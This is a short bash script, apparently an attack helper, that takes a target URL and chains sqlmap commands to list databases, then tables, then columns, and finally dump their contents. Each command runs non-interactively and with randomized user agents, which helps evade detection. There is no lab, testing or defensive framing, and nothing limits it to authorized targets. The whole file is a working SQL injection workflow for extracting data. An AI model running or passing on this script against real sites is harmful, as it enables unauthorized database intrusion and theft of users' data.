read -p "Enter URL: " URL



sqlmap -u $URL --dbs --batch --random-agent



read -p "Enter Database: " D
sqlmap -u $URL -D $D  --tables --batch --random-agent


read -p "Enter Tables: " T
sqlmap -u $URL -D $D -T $T --columns --batch --random-agent


read -p "Enter Columns: " C
sqlmap -u $URL -D $D -T $T -C $C --dump --batch --random-agent


